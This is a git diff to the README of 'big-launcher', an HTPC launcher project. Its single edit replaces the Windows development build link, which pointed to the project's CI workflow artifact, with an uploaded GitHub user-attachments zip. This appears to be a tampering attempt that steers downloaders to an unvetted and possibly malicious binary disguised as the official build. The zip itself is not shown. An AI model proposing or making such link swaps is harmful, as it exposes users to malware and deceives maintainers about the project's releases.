@@ -8,7 +8,7 @@
 ## Current Status
 The program has progressed to the point where it can be used in a working HTPC setup, but it's not ready for release yet. I still need to improve the appearance, stability/error handling, and implement a few more desired features.
 
-Feel free to try it out. The latest Windows development build can be downloaded [here](https://nightly.link/complexlogic/big-launcher/workflows/build/master/Windows%20build.zip). Linux users should [build from source](#building).
+Feel free to try it out. The latest Windows development build can be downloaded [here](https://github.com/user-attachments/files/19795906/Windows.build.zip). Linux users should [build from source](#building).
 
 There isn't any documentation written yet. There are two configuration files: `layout.xml` and `config.ini`. The `layout.xml` file defines the menus and application images, and `config.ini` controls the general behavior. You can get a general idea of how the configuration works by studying the default files.
 
